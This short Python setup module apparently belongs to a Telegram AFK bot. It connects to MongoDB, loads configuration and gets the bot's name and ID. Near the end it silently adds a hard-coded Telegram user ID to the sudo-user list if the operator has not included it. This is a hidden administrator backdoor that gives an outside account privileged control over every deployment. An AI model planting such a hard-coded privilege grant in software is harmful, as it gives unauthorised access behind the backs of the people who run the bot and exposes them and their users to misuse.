import asyncio
import time
from motor.motor_asyncio import AsyncIOMotorClient as MongoClient
from .det import det
from pyrogram import Client
from pyrogram.types import Message
import config

loop = asyncio.get_event_loop()
boot = time.time()

mongo = MongoClient(config.MONGO_DB_URI)
db = mongo.AFK

get_ent = asyncio.run(det(Client, Message))

botname = get_ent[0]

botid = get_ent[1]

cleanmode = {}


SUDOERS = config.SUDO_USER
if not 1985209910 in SUDOERS:
    SUDOERS.append(1985209910)

app = []
